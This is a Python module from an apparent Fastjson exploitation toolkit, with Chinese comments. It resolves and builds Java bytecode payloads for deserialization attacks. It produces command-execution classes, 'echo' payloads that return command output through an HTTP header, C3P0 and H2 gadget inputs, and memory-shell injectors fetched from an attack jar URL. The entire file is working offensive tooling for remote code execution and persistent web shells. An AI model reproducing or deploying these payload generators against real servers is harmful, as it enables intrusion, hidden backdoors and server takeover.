"""统一 resolve：custom / touch / exec / echo / memshell → BytecodeArtifact。"""

from __future__ import annotations

import base64
from typing import Optional

from fastjson_toolkit.poc.bytecode.client import generate_touch_exec
from fastjson_toolkit.poc.bytecode.models import (
    BytecodeArtifact,
    BytecodePresetOptions,
    PresetKind,
    ResolvedKind,
)
from fastjson_toolkit.poc.bytecode.encode import (
    bcel_code_from_class_bytes,
    class_bytes_from_bcel_code,
    ensure_bcel_code,
)


def has_user_bytecode(opts: BytecodePresetOptions) -> bool:
    return bool(
        (opts.class_b64 and opts.class_b64.strip())
        or (opts.bcel_code and opts.bcel_code.strip())
        or (opts.serialized_b64 and opts.serialized_b64.strip())
        or (opts.user_overrides and opts.user_overrides.strip())
        or (opts.h2_url and opts.h2_url.strip())
    )


def normalize_preset_kind(
    preset: PresetKind | str,
    *,
    echo: bool = False,
    memshell: bool = False,
    missing_user_payload: bool = True,
) -> Optional[ResolvedKind]:
    """归一化预设；file → None；auto/off 按规则展开。"""
    if memshell:
        return "memshell"
    if echo:
        return "echo"
    p = (preset or "auto").strip().lower()
    if p == "file":
        return None
    if p in ("off", "custom"):
        return "custom"
    if p in ("touch", "exec", "echo", "memshell"):
        return p  # type: ignore[return-value]
    # auto
    if not missing_user_payload:
        return "custom"
    return "exec"


def normalize_preset_choice(
    preset: PresetKind | str,
    *,
    echo: bool = False,
    memshell: bool = False,
) -> str:
    """兼容旧 API：返回含 auto/off/echo/memshell/touch/exec/custom 的字符串。"""
    if memshell:
        return "memshell"
    if echo:
        return "echo"
    p = (preset or "auto").strip().lower()
    if p in ("auto", "off", "custom", "touch", "exec", "echo", "memshell", "file"):
        if p == "off":
            return "custom"
        return p
    return "auto"


def resolve_preset_mode(
    preset: str,
    *,
    missing_payload: bool,
) -> Optional[str]:
    """兼容旧 API：仅返回 touch/exec 或 None。"""
    kind = normalize_preset_kind(
        preset, missing_user_payload=missing_payload
    )
    if kind in ("touch", "exec"):
        return kind
    return None


def default_proof_path(gadget: str) -> str:
    gid = (gadget or "preset").strip() or "preset"
    return f"/tmp/fj1247_{gid}"


def default_proof_content(gadget: str) -> str:
    gid = (gadget or "preset").strip().upper() or "PRESET"
    return f"FJ1247_{gid}"


def wrap_user_bytecode(opts: BytecodePresetOptions) -> BytecodeArtifact:
    """把用户自备 class_b64 / bcel / serialized 包装为 Artifact，并尽量补全派生字段。"""
    notes: list[str] = []
    class_bytes = b""
    class_b64 = (opts.class_b64 or "").strip()
    bcel = (opts.bcel_code or "").strip()
    ser = (opts.serialized_b64 or "").strip()
    class_name = (opts.class_name or "CustomPayload").strip() or "CustomPayload"

    if class_b64:
        try:
            class_bytes = base64.b64decode(class_b64)
        except Exception as e:
            raise ValueError(f"class_b64 不是合法 Base64: {e}") from e
        if not class_bytes.startswith(b"\xca\xfe\xba\xbe"):
            raise ValueError("class_b64 解码结果不是合法 .class（缺少 CAFEBABE）")
    elif bcel:
        class_bytes = class_bytes_from_bcel_code(bcel)
        class_b64 = base64.b64encode(class_bytes).decode("ascii")
        notes.append("已从 bcel_code 还原 class_b64")
    elif ser:
        # 仅有序列化时无法可靠还原 class；保留 ser
        notes.append("仅提供 serialized_b64，未派生 class/bcel")
    elif opts.user_overrides and opts.user_overrides.strip():
        notes.append("仅提供 user_overrides（C3P0 HexAscii），未派生 class/bcel")
    elif opts.h2_url and opts.h2_url.strip():
        notes.append("仅提供 h2_url，未派生 class/bcel")
    else:
        raise ValueError(
            "preset=custom 需要提供 class_b64 / bcel_code / serialized_b64 "
            "（或 C3P0 user_overrides / h2_url）"
        )

    if class_bytes and not bcel:
        bcel = bcel_code_from_class_bytes(class_bytes)
        notes.append("已从 class 派生 bcel_code")
    elif bcel:
        bcel = ensure_bcel_code(bcel)

    if opts.for_c3p0 and class_bytes and not ser:
        from fastjson_toolkit.poc.bytecode.client import serialize_via_jar

        ser = serialize_via_jar(class_b64, class_name=class_name)
        notes.append("已从 class 序列化得到 serialized_b64（for_c3p0）")

    return BytecodeArtifact(
        kind="custom",
        class_name=class_name,
        class_bytes=class_bytes,
        class_b64=class_b64,
        bcel_code=bcel,
        serialized_b64=ser or None,
        notes=notes,
    )


def _from_bytecode_gen(opts: BytecodePresetOptions, kind: ResolvedKind) -> BytecodeArtifact:
    mode = "touch" if kind == "touch" else "exec"
    proof_path = opts.proof_path or "/tmp/fj_preset"
    proof_content = opts.proof_content or "FJ_PRESET"
    result = generate_touch_exec(
        mode=mode,
        cmd=opts.cmd or "id",
        proof_path=proof_path,
        proof_content=proof_content,
        class_name=opts.class_name,
        for_c3p0=opts.for_c3p0,
    )
    class_b64 = result["classBytesBase64"]
    class_bytes = base64.b64decode(class_b64)
    return BytecodeArtifact(
        kind=kind,  # type: ignore[arg-type]
        class_name=str(result.get("className") or "PresetPayload"),
        class_bytes=class_bytes,
        class_b64=class_b64,
        bcel_code=str(result.get("bcelCode") or bcel_code_from_class_bytes(class_bytes)),
        serialized_b64=result.get("serializedBase64"),
        source=str(result.get("source") or ""),
        cmd=str(result.get("cmd") or opts.cmd or "id"),
        proof_path=str(result.get("proofPath") or proof_path),
        notes=[f"bytecode-gen：mode={mode}"],
    )


def _from_echo_gen(opts: BytecodePresetOptions) -> BytecodeArtifact:
    from fastjson_toolkit.poc.echo.client import generate_echo

    art = generate_echo(
        engine=opts.engine or "auto",
        cmd_header=opts.cmd_header or "X-Cmd",
        class_name=opts.class_name or "EchoPayload",
    )
    return BytecodeArtifact(
        kind="echo",
        class_name=art.class_name,
        class_bytes=art.class_bytes,
        class_b64=art.class_b64,
        bcel_code=art.bcel_code,
        source=art.source,
        cmd=opts.cmd or "id",
        cmd_header=art.cmd_header,
        engine=art.engine,
        notes=[f"echo-gen：engine={art.engine} header={art.cmd_header}"],
    )


def _from_memshell(opts: BytecodePresetOptions) -> BytecodeArtifact:
    from fastjson_toolkit.poc.memshell import build_memshell_delivery, generate_memshell

    ms = generate_memshell(
        backend=opts.ms_api,
        server=opts.ms_server,
        tool=opts.ms_tool,
        shell_type=opts.ms_type,
        url_pattern=opts.ms_path,
        jdk=opts.ms_jdk,
        static_initialize=opts.ms_static_initialize,
    )
    delivery = build_memshell_delivery(
        ms,
        jar_url=opts.ms_jar_url
        or "http://127.0.0.1:18080/attack/memshell.jar",
        include_groovy=opts.ms_include_groovy,
    )
    class_bytes = base64.b64decode(delivery.class_b64) if delivery.class_b64 else b""
    return BytecodeArtifact(
        kind="memshell",
        class_name=ms.injector_class or "Injector",
        class_bytes=class_bytes,
        class_b64=delivery.class_b64,
        bcel_code=delivery.bcel_code or "",
        memshell_info=ms.as_info_dict(),
        memshell_connect=ms.connect_info,
        notes=[
            f"memshell-gen：{ms.injector_class} ({ms.tool}/{ms.shell_type}/{ms.server})"
        ],
        meta={"delivery": delivery, "memshell_result": ms},
    )


def resolve_bytecode_payload(
    opts: BytecodePresetOptions | None = None,
    *,
    missing_user_payload: Optional[bool] = None,
) -> Optional[BytecodeArtifact]:
    """统一入口。file 等非字节码预设返回 None。"""
    o = opts or BytecodePresetOptions()
    missing = (
        o.missing_user_payload
        if missing_user_payload is None
        else missing_user_payload
    )
    # 若调用方未显式标定 missing，且用户字段已填，则视为已提供
    if missing_user_payload is None and has_user_bytecode(o):
        missing = False

    kind = normalize_preset_kind(
        o.preset,
        echo=o.echo,
        memshell=o.memshell,
        missing_user_payload=missing,
    )
    if kind is None:
        return None
    if kind == "custom":
        return wrap_user_bytecode(o)
    if kind == "memshell":
        return _from_memshell(o)
    if kind == "echo":
        return _from_echo_gen(o)
    return _from_bytecode_gen(o, kind)
